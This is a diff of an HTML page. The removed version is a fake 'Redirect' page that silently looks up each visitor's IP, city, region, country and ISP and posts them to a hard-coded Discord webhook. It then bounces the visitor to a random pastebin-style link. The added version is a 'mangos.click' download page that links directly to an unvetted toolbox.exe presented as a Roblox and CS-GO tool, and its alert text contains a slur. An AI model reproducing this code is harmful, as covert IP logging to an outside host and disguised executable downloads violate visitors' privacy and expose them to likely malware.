@@ -1,77 +1,126 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirect</title>
-    <script>
-        document.addEventListener('DOMContentLoaded', function () {
-            // Fetch the geolocation data
-            fetch('https://ipapi.co/json/')
-                .then(response => response.json())
-                .then(data => {
-                    const payload = {
-                        username: "Geo Logger",
-                        embeds: [
-                            {
-                                title: "New User Location",
-                                color: 16711680, // red
-                                fields: [
-                                    { name: "IP Address", value: data.ip, inline: true },
-                                    { name: "City", value: data.city, inline: true },
-                                    { name: "Region", value: data.region, inline: true },
-                                    { name: "Country", value: data.country_name, inline: true },
-                                    { name: "ISP", value: data.org, inline: false }
-                                ],
-                                timestamp: new Date().toISOString()
-                            }
-                        ]
-                    };
+  <meta charset="UTF-8" />
+  <title>mangos.click - Download Center</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(to right, #2b5876, #4e4376);
+      font-family: 'Segoe UI', sans-serif;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
 
-                    // Send data to the Discord webhook
-                    fetch("https://discord.com/api/webhooks/1373372268364697711/l1jvJLJupKMQyq9P3LhuW_GgK0XJkZ0QNN9VjzOLQNIj2T10f6LakOKMSoZi_H9IsM_E", {
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/json"
-                        },
-                        body: JSON.stringify(payload)
-                    })
-                    .then(response => {
-                        if (response.ok) {
-                            console.log('Data sent to Discord successfully!');
-                            // After the request is successful, redirect to a random site
-                            redirectToRandomSite();
-                        } else {
-                            console.error('Failed to send data to Discord');
-                        }
-                    })
-                    .catch(error => {
-                        console.error('Error sending data to Discord:', error);
-                    });
-                })
-                .catch(error => {
-                    console.error('Error fetching geolocation data:', error);
-                });
+    .container {
+      background: rgba(0, 0, 0, 0.7);
+      padding: 40px;
+      border-radius: 10px;
+      text-align: center;
+      max-width: 400px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+    }
 
-            // Function to redirect to a random site
-            function redirectToRandomSite() {
-                const randomSites = [
-                    "http://justpaste.it/8wsbh",
-                    "https://justpaste.it/8kozp",
-                    "http://justpaste.it/f001e",
-                    "http://justpaste.it/h4y94",
-		    "http://justpaste.it/f0dos",
-		    "http://easytech.space"
-                ];
-                const randomIndex = Math.floor(Math.random() * randomSites.length);
-                const randomSite = randomSites[randomIndex];
-                window.location.href = randomSite;
-            }
-        });
-    </script>
+    h1 {
+      margin-bottom: 20px;
+      font-size: 28px;
+    }
+
+    /* Animated dropdown */
+    select {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      margin-bottom: 20px;
+      background: #fff;
+      color: #000;
+      appearance: none;
+      -webkit-appearance: none;
+      -moz-appearance: none;
+      position: relative;
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+      cursor: pointer;
+    }
+
+    /* Add a custom arrow */
+    select {
+      background-image:
+        linear-gradient(45deg, transparent 50%, #000 50%),
+        linear-gradient(135deg, #000 50%, transparent 50%),
+        linear-gradient(to right, #ccc, #ccc);
+      background-position:
+        calc(100% - 20px) calc(1em + 2px),
+        calc(100% - 15px) calc(1em + 2px),
+        calc(100% - 25px) 0.5em;
+      background-size: 5px 5px, 5px 5px, 1px 1.5em;
+      background-repeat: no-repeat;
+    }
+
+    select:focus {
+      outline: none;
+      box-shadow: 0 0 12px #28a745;
+      transform: scale(1.05);
+      background-color: #f0f0f0;
+      color: #000;
+      transition: transform 0.3s ease, box-shadow 0.3s ease, background-color 0.3s ease, color 0.3s ease;
+    }
+
+    /* Animated button */
+    button {
+      padding: 12px 20px;
+      background-color: #28a745;
+      border: none;
+      border-radius: 5px;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.3s, transform 0.2s, box-shadow 0.3s;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+    }
+
+    button:hover {
+      background-color: #218838;
+      transform: scale(1.05);
+      box-shadow: 0 6px 12px #28a745;
+    }
+
+    .footer {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #aaa;
+    }
+  </style>
 </head>
 <body>
-    <h1>LAST LINK ACCESS TELEPORT</h1>
-    <p>SENDING USER TO LAST WEBSITE...</p>
+  <div class="container">
+    <h1>mangos.click Downloads</h1>
+    <select id="toolSelect">
+      <option value="">-- Choose a Tool --</option>
+      <option value="toolbox">Toolbox Roblox</option>
+      <option value="exloader">ExLoader CS-GO</option>
+    </select>
+    <button onclick="redirect()">Download</button>
+    <div class="footer">© 2025 mangos.click</div>
+  </div>
+
+  <script>
+    function redirect() {
+      const value = document.getElementById('toolSelect').value;
+      if (value === "toolbox") {
+        window.location.href = "https://github.com/dariosfiles/random-stuff/raw/refs/heads/main/toolbox.exe";
+      } else if (value === "exloader") {
+        window.location.href = "https://en.exloader.net/";
+      } else {
+        alert("No tool selected retard");
+      }
+    }
+  </script>
 </body>
 </html>
